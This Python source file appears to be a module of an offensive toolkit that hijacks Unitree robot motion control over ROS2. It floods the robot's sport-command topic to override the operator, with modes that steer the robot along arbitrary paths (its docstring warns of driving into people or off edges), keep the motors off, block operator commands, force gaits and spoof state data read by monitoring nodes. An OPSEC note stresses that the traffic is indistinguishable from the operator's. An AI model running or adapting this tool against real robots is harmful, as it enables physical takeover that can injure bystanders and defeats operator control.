#!/usr/bin/env python3
"""
unitree_sport_hijacker.py - Phase 7 Module 4: Continuous Sport Mode Hijacking

Maintains persistent motion control over a Unitree robot by continuously publishing
sport commands at high frequency, overwhelming legitimate operator input.

Unlike unitree_api_exploit (one-shot commands), this module sustains control for
the full --duration window by publishing at 10–50Hz — above the operator's typical
update rate. The robot's sport controller uses the most-recent command, so injecting
at high frequency starves out the legitimate controller.

Attack modes:
  velocity_lock   — Continuously inject MOVE command (api_id=1008) with chosen vx/vy/vyaw.
                    Can redirect robot to arbitrary trajectory. CRITICAL: robot will drive
                    into obstacles, off edges, or into personnel.

  emergency_freeze— Spam STOP_MOVE (1003) then BALANCE_STAND (1002) at 50Hz.
                    Prevents operator from issuing move commands. DoS of motion control.

  damp_loop       — Repeatedly send DAMP (1001) at 20Hz. Any recovery attempt by the
                    operator or the robot's auto-recovery is immediately cancelled.
                    The robot remains in motor-off state indefinitely.

  gait_force      — Lock the robot into a specific gait type via SPEED_LEVEL + MOVE.
                    Useful to prevent operator from switching to a safe gait.

  spoof_state     — Publish fake SportModeState to /rt/sportmodestate — misleads any
                    subscriber (monitoring nodes, navigation) about the robot's position,
                    velocity, and gait. Does not affect the robot's own state.

OPSEC note:
  All commands appear as legitimate unitree_api/msg/Request messages. Without DDS-Security
  enabled (UNITREE-003), there is no way for the robot to distinguish attacker traffic
  from operator traffic.
"""

import subprocess
import json
import time
import threading
import signal
from enum import Enum
from typing import Optional


class SportHijackMode(str, Enum):
    VELOCITY_LOCK    = "velocity_lock"
    EMERGENCY_FREEZE = "emergency_freeze"
    DAMP_LOOP        = "damp_loop"
    GAIT_FORCE       = "gait_force"
    SPOOF_STATE      = "spoof_state"
    ENUMERATE        = "enumerate"


SPORT_REQUEST_TOPIC = "/api/sport/request"
SPORT_STATE_TOPIC   = "/rt/sportmodestate"
SPORT_MSG_TYPE      = "unitree_api/msg/Request"
STATE_MSG_TYPE      = "unitree_go/msg/SportModeState"

API_STOP_MOVE     = 1003
API_BALANCE_STAND = 1002
API_DAMP          = 1001
API_MOVE          = 1008
API_SPEED_LEVEL   = 1015


def _request_yaml(api_id: int, param: str = "", seq: int = 1) -> str:
    return (
        f"header:\n"
        f"  identity:\n"
        f"    id: {seq}\n"
        f"    api_id: {api_id}\n"
        f"  lease:\n"
        f"    id: 0\n"
        f"  policy:\n"
        f"    priority: 0\n"
        f"    noreply: false\n"
        f"parameter: '{param}'\n"
        f"binary: []\n"
    )


def _sportstate_yaml(vx: float = 0.0, vy: float = 0.0, vyaw: float = 0.0,
                     gait: int = 0, x: float = 0.0, y: float = 0.0,
                     yaw: float = 0.0) -> str:
    return (
        f"mode: 2\n"
        f"progress: 0.0\n"
        f"gait_type: {gait}\n"
        f"foot_raise_height: 0.09\n"
        f"position: [{x:.3f}, {y:.3f}, 0.0]\n"
        f"body_height: 0.32\n"
        f"velocity: [{vx:.3f}, {vy:.3f}, {vyaw:.3f}]\n"
        f"yaw_speed: {vyaw:.3f}\n"
        f"range_obstacle: [5.0, 5.0, 5.0, 5.0]\n"
        f"foot_position_body: [[0.17,-0.1,-0.3],[0.17,0.1,-0.3],[-0.17,-0.1,-0.3],[-0.17,0.1,-0.3]]\n"
        f"foot_speed_body: [[0.0,0.0,0.0],[0.0,0.0,0.0],[0.0,0.0,0.0],[0.0,0.0,0.0]]\n"
    )


def _pub_continuous(topic: str, msg_type: str, yaml_msg: str,
                    domain_id: int, rate: float, duration: float) -> tuple:
    cmd = [
        "ros2", "topic", "pub", f"--rate={rate:.0f}", "--no-daemon",
        "--ros-args", f"__domain_id:={domain_id}",
        "--", topic, msg_type, yaml_msg,
    ]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=3.0)
        return True, f"Published for {duration:.1f}s at {rate:.0f}Hz (~{int(duration*rate)} msgs)"
    except subprocess.TimeoutExpired:
        proc.kill()
        return True, f"Published for {duration:.1f}s"
    except (FileNotFoundError, OSError) as e:
        return False, str(e)


def _pub_once(topic: str, msg_type: str, yaml_msg: str, domain_id: int) -> tuple:
    try:
        r = subprocess.run(
            ["ros2", "topic", "pub", "--once", "--no-daemon",
             "--ros-args", f"__domain_id:={domain_id}",
             "--", topic, msg_type, yaml_msg],
            capture_output=True, text=True, timeout=8.0
        )
        return r.returncode == 0, r.stdout + r.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        return False, str(e)


def velocity_lock(vx: float, vy: float, vyaw: float,
                  domain_id: int, duration: float,
                  rate: float = 10.0, verbose: bool = False) -> dict:
    param  = json.dumps({"x": round(vx, 4), "y": round(vy, 4), "z": round(vyaw, 4)})
    yaml   = _request_yaml(API_MOVE, param)

    print(f"[*] VELOCITY_LOCK: vx={vx:.2f} vy={vy:.2f} vyaw={vyaw:.2f} "
          f"@ {rate:.0f}Hz for {duration:.1f}s")
    print(f"    Publishing to {SPORT_REQUEST_TOPIC} on domain {domain_id}")

    ok, output = _pub_continuous(SPORT_REQUEST_TOPIC, SPORT_MSG_TYPE, yaml,
                                  domain_id, rate, duration)

    return {
        "mode": "velocity_lock",
        "vx": vx, "vy": vy, "vyaw": vyaw,
        "rate_hz": rate, "duration_s": duration,
        "msgs_sent": int(duration * rate),
        "sent": ok,
        "output": output,
    }


def emergency_freeze(domain_id: int, duration: float,
                     rate: float = 50.0, verbose: bool = False) -> dict:
    """Alternating STOP_MOVE → BALANCE_STAND spam at 50Hz."""
    print(f"[*] EMERGENCY_FREEZE: spamming STOP_MOVE+BALANCE_STAND @ {rate:.0f}Hz for {duration:.1f}s")

    stop_yaml    = _request_yaml(API_STOP_MOVE)
    balance_yaml = _request_yaml(API_BALANCE_STAND, seq=2)

    results = []
    deadline = time.monotonic() + duration
    seq      = 1

    try:
        while time.monotonic() < deadline:
            yaml = _request_yaml(API_STOP_MOVE if seq % 2 == 1 else API_BALANCE_STAND, seq=seq)
            ok, _ = _pub_once(SPORT_REQUEST_TOPIC, SPORT_MSG_TYPE, yaml, domain_id)
            results.append(ok)
            seq += 1
            time.sleep(max(0.0, 1.0 / rate))
    except KeyboardInterrupt:
        pass

    sent_count = sum(results)
    return {
        "mode": "emergency_freeze",
        "msgs_sent": len(results),
        "msgs_ok": sent_count,
        "rate_hz": rate,
        "duration_s": duration,
        "sent": sent_count > 0,
    }


def damp_loop(domain_id: int, duration: float,
              rate: float = 20.0, verbose: bool = False) -> dict:
    """Continuously send DAMP to prevent auto-recovery."""
    print(f"\033[91m[!] DAMP_LOOP: robot will remain motor-off for {duration:.1f}s\033[0m")
    yaml = _request_yaml(API_DAMP)
    ok, output = _pub_continuous(SPORT_REQUEST_TOPIC, SPORT_MSG_TYPE, yaml,
                                  domain_id, rate, duration)
    return {
        "mode": "damp_loop",
        "api_id": API_DAMP,
        "rate_hz": rate,
        "duration_s": duration,
        "msgs_sent": int(duration * rate),
        "sent": ok,
        "output": output,
    }


def gait_force(gait_type: int, vx: float, vy: float, vyaw: float,
               domain_id: int, duration: float,
               rate: float = 10.0, verbose: bool = False) -> dict:
    """Lock robot into a specific gait + velocity. Gait types: 0=idle, 1=trot, 2=trot run, 3=stairs."""
    print(f"[*] GAIT_FORCE: gait={gait_type} vx={vx:.2f} vy={vy:.2f} vyaw={vyaw:.2f}")

    results = []
    deadline = time.monotonic() + duration
    seq      = 1

    try:
        while time.monotonic() < deadline:
            # Alternate: set speed level first, then move
            if seq % 3 == 0:
                yaml = _request_yaml(API_SPEED_LEVEL,
                                     json.dumps({"level": min(2, max(0, gait_type))}), seq)
            else:
                yaml = _request_yaml(API_MOVE,
                                     json.dumps({"x": vx, "y": vy, "z": vyaw}), seq)
            ok, _ = _pub_once(SPORT_REQUEST_TOPIC, SPORT_MSG_TYPE, yaml, domain_id)
            results.append(ok)
            seq += 1
            time.sleep(max(0.0, 1.0 / rate))
    except KeyboardInterrupt:
        pass

    return {
        "mode": "gait_force",
        "gait_type": gait_type,
        "vx": vx, "vy": vy, "vyaw": vyaw,
        "msgs_sent": len(results),
        "msgs_ok": sum(results),
        "rate_hz": rate,
        "duration_s": duration,
        "sent": sum(results) > 0,
    }


def spoof_state(vx: float, vy: float, vyaw: float,
                gait: int, domain_id: int, duration: float,
                rate: float = 25.0, verbose: bool = False) -> dict:
    """
    Publish fake SportModeState to mislead navigation/monitoring subscribers.
    Does NOT affect the robot's own state — targets downstream consumers of /rt/sportmodestate.
    """
    yaml = _sportstate_yaml(vx, vy, vyaw, gait)
    print(f"[*] SPOOF_STATE: publishing fake SportModeState @ {rate:.0f}Hz for {duration:.1f}s")
    print(f"    Spoofed velocity: vx={vx:.2f} vy={vy:.2f} vyaw={vyaw:.2f}, gait={gait}")

    ok, output = _pub_continuous(SPORT_STATE_TOPIC, STATE_MSG_TYPE, yaml,
                                  domain_id, rate, duration)

    return {
        "mode": "spoof_state",
        "spoofed_vx": vx, "spoofed_vy": vy, "spoofed_vyaw": vyaw,
        "spoofed_gait": gait,
        "rate_hz": rate,
        "duration_s": duration,
        "msgs_sent": int(duration * rate),
        "sent": ok,
        "output": output,
        "note": "Spoofs /rt/sportmodestate — affects subscribers, not robot actuators",
    }


def enumerate_attack_surface(domain_id: int) -> dict:
    topics_of_interest = [
        SPORT_REQUEST_TOPIC, SPORT_STATE_TOPIC,
        "/api/loco/request", "/rt/lowcmd", "/rt/lowstate",
    ]
    presence = {}
    for t in topics_of_interest:
        try:
            r = subprocess.run(
                ["ros2", "topic", "info", t, "--no-daemon",
                 "--ros-args", f"__domain_id:={domain_id}"],
                capture_output=True, text=True, timeout=4.0
            )
            presence[t] = "active" if r.returncode == 0 else "not found"
        except (FileNotFoundError, OSError):
            presence[t] = "ros2 CLI unavailable"

    return {
        "domain_id": domain_id,
        "topic_presence": presence,
        "modes": {m.value: m.value for m in SportHijackMode if m != SportHijackMode.ENUMERATE},
        "recommended": (
            "velocity_lock: full motion takeover (continuous MOVE injection)\n"
            "damp_loop: persistent motor-off DoS\n"
            "emergency_freeze: prevent operator commands (STOP_MOVE spam)\n"
            "spoof_state: deceive navigation/monitoring consumers"
        ),
    }


def run(mode: SportHijackMode = SportHijackMode.ENUMERATE,
        domain_id: int = 0,
        vx: float = 0.0, vy: float = 0.0, vyaw: float = 0.0,
        gait_type: int = 1,
        duration: float = 10.0,
        rate: float = 10.0,
        verbose: bool = False) -> dict:

    if mode == SportHijackMode.ENUMERATE:
        return enumerate_attack_surface(domain_id)

    if mode == SportHijackMode.VELOCITY_LOCK:
        return velocity_lock(vx, vy, vyaw, domain_id, duration, rate, verbose)

    if mode == SportHijackMode.EMERGENCY_FREEZE:
        return emergency_freeze(domain_id, duration, max(rate, 10.0), verbose)

    if mode == SportHijackMode.DAMP_LOOP:
        return damp_loop(domain_id, duration, rate, verbose)

    if mode == SportHijackMode.GAIT_FORCE:
        return gait_force(gait_type, vx, vy, vyaw, domain_id, duration, rate, verbose)

    if mode == SportHijackMode.SPOOF_STATE:
        return spoof_state(vx, vy, vyaw, gait_type, domain_id, duration, rate, verbose)

    return {"error": f"Unknown mode: {mode}"}


def print_sport_report(result: dict):
    if result.get("error"):
        print(f"\n\033[91m[!] {result['error']}\033[0m")
        return

    if result.get("topic_presence"):
        print(f"\n\033[92m[+] Sport Hijacker — Attack Surface\033[0m")
        print(f"    Domain: {result.get('domain_id', 0)}")
        for t, status in result.get("topic_presence", {}).items():
            clr = "\033[92m" if "active" in status else "\033[91m"
            print(f"    {clr}{t}\033[0m: {status}")
        print(f"\n    Recommended modes:\n{result.get('recommended', '')}")
        return

    mode   = result.get("mode", "")
    sent   = result.get("sent", False)
    msgs   = result.get("msgs_sent", 0)
    msgs_ok = result.get("msgs_ok", msgs)

    clr = "\033[92m" if sent else "\033[91m"
    print(f"\n{clr}[{'DONE' if sent else 'FAILED'}]\033[0m Mode: {mode}")
    print(f"    Messages sent : {msgs_ok}/{msgs}")
    if result.get("rate_hz"):
        print(f"    Rate          : {result['rate_hz']:.0f}Hz for {result.get('duration_s',0):.1f}s")

    if mode == "velocity_lock":
        print(f"    Velocity cmd  : vx={result['vx']:.2f} vy={result['vy']:.2f} "
              f"vyaw={result['vyaw']:.2f} m/s")
    elif mode == "spoof_state":
        print(f"    Note: {result.get('note', '')}")

    if not sent and result.get("output"):
        print(f"    Tip: ensure unitree_ros2 workspace is sourced")


def export_json(result: dict, path: str):
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print(f"[+] Saved to {path}")
